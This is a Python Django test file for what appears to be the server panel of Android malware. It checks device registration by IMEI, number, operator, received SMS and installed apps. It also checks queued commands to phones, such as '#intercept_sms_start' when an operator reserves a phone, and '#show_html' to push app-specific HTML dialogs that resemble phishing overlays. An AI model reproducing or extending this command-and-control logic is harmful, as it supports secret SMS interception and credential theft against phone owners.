from StringIO import StringIO
import gzip
import json

from django.conf import settings
from django.core.handlers.wsgi import WSGIRequest
from django.test import TestCase, Client

from . import command_queue, models, idgen, commands, remote_api, cache


class RequestFactory(Client):
    def request(self, **request):
        environ = {
            'HTTP_COOKIE': self.cookies,
            'PATH_INFO': '/',
            'QUERY_STRING': '',
            'REQUEST_METHOD': 'GET',
            'SCRIPT_NAME': '',
            'SERVER_NAME': 'testserver',
            'SERVER_PORT': 80,
            'SERVER_PROTOCOL': 'HTTP/1.1',
        }
        environ.update(self.defaults)
        environ.update(request)
        return WSGIRequest(environ)


class CommandTest(TestCase):
    def setUp(self):
        settings.REDIS.flushdb()
        self.user = models.SysUser.objects.create(username="test")
        self.phone = models.PhoneData.objects.create(number="322223", imei="ZZ345", country="RU")
        self.installer = models.Installer.objects.create(username='installer1', user_id=1)
        self.dialog1 = models.RemoteDialog.objects.create(sender='testsender1', description='t1', dlg1='f1',
                                                          html_contents='<html><body>hello 1</body></html>')
        self.dialog1 = models.RemoteDialog.objects.create(sender='testsender2', app='testapp', priority=10,
                                                          description='t2', dlg1='f2',
                                                          html_contents='<html><body>hello 2</body></html>'
        )
        self.phone_id = self.phone.uniq_id

    def test_command_queue(self):
        # initial checks
        self.assertTrue(command_queue.has_commands(
            self.phone_id))  # # todo: fix test so it takes into account sentid command in buffer after new phone created
        self.assertEqual('#sentid +13478096873', command_queue.get_next_command(self.phone_id))
        self.assertEqual(commands.PHONE_STATE_STABLE, commands.get_phone_transient_state(self.phone_id))
        # add the command and run state checks
        commands.reserve_phone(self.user, self.phone)
        self.assertTrue(command_queue.has_commands(self.phone_id))
        self.assertEqual("#intercept_sms_start", command_queue.get_next_command(self.phone_id))
        self.assertEqual(commands.PHONE_STATE_LOCKING, commands.get_phone_transient_state(self.phone_id))

    def test_registration(self):
        def test_with_data(test_app_data):
            rf = RequestFactory()
            buf = StringIO(test_app_data)
            outb = StringIO()
            f = gzip.GzipFile(fileobj=outb, mode='wb')
            f.write(test_app_data)
            data = outb.getvalue()
            rf_post = rf.post('/app/remote', data=data, content_type='application/json')
            rf_post.META['HTTP_CONTENT_ENCODING'] = "gzip"
            resp = remote_api.process(rf_post)
            self.assertEqual(200, resp.status_code, "Executed successfully")
            ro = json.loads(resp.content)
            code = ro['code']
            self.assertEqual(10, len(code))
            resp = remote_api.process(rf.post('/app/remote', data='{"type": "device check", "code": "' + code + '"}',
                                              content_type='application/json'))
            self.assertEqual(200, resp.status_code, "Executed successfully")
            return json.loads(resp.content)

        test_app_data0 = """
        {
        "os":"4.0.3","model":"LGE LG-XXXXX","phone number":"+111111111","client number":"1","type":"device info",
        "imei":"111111111111","country":"US", "operator" : "ZZZ"
        }
        """
        ro = test_with_data(test_app_data0)
        self.assertEqual('', ro['command'])
        test_app_data1 = """
        {
        "os":"4.0.3","model":"LGE LG-XXXXX","phone number":"+222222222","client number":"1","type":"device info",
        "imei":"2222222222","country":"US", "operator" : "ZZZ",
        "sms": [{"from": "testsender1", "body": "test SMS 1"}],
        "apps": ["testapp"]
        }
        """
        ro = test_with_data(test_app_data1)
        self.assertEqual('#show_html', ro['command'])
        self.assertEqual('f2', ro['params']['first dialog'])
        models.Option.objects.create(name="blacklist", content="""
        testapp
        """)
        cache.rebuild_cache()
        ro = test_with_data(test_app_data1)
        self.assertEqual('#show_html', ro['command'])


class IDGenerateTest(TestCase):
    def test_generate_id(self):
        uniq_id = idgen.generate_uniq_id()
        print uniq_id
        self.assertEqual(10, len(uniq_id))


class OperatorTest(TestCase):
    def test_operator_name(self):
        op = models.MobileOperator(name="310260")
        self.assertEqual('T-Mobile (260) - Bermuda', unicode(op))
        op1 = models.MobileOperator(name='311580')
        self.assertEqual('Unknown (311/580)', unicode(op1))
        op2 = models.MobileOperator(name='666322')
        self.assertEqual('Unknown (666/322)', unicode(op2))


class CacheTest(TestCase):
    def setUp(self):
        models.Option.objects.create(name="blacklist", content="""
        ttt
        aaa
        zzzz
        """)

    def test_cache(self):
        cache.rebuild_cache()
        self.assertTrue(cache.is_blacklisted('aaa'))
